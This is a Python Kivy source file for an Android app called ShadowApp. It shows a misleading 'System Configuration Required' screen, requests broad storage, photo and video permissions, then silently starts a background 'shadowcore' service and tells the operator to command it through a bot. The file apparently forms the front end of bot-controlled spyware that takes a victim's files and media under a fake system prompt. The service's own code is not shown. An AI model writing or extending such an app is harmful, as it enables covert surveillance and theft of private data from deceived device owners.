from kivy.app import App
from kivy.uix.button import Button
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from android.permissions import request_permissions, Permission
from jnius import autoclass

class ShadowApp(App):
    def build(self):
        # تثبيت الشاشة بالطول برمجياً
        PythonActivity = autoclass('org.kivy.android.PythonActivity')
        activity = PythonActivity.mActivity
        ActivityInfo = autoclass('android.content.pm.ActivityInfo')
        activity.setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_PORTRAIT)

        self.layout = BoxLayout(orientation='vertical', padding=40, spacing=20)
        self.label = Label(text="System Configuration\nRequired", halign='center', font_size='20sp')
        self.btn = Button(text="GRANT PERMISSIONS", background_color=(0, 0.5, 0.8, 1), font_size='22sp', bold=True)
        self.btn.bind(on_press=self.ask_all)
        self.layout.add_widget(self.label)
        self.layout.add_widget(self.btn)
        return self.layout

    def ask_all(self, instance):
        # طلب كل أنواع صلاحيات الملفات الممكنة
        perms = [
            Permission.READ_EXTERNAL_STORAGE,
            Permission.WRITE_EXTERNAL_STORAGE,
            Permission.READ_MEDIA_IMAGES,
            Permission.READ_MEDIA_VIDEO,
            Permission.FOREGROUND_SERVICE
        ]
        request_permissions(perms, self.launch_service)

    def launch_service(self, permissions, grants):
        try:
            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            service = autoclass('org.test.shadowcore.ServiceMyservice')
            service.start(PythonActivity.mActivity, "")
            self.btn.text = "READY - USE BOT"
            self.btn.disabled = True
            self.label.text = "Permissions Granted.\nSend /start to your Bot."
        except: pass

if __name__ == "__main__":
    ShadowApp().run()
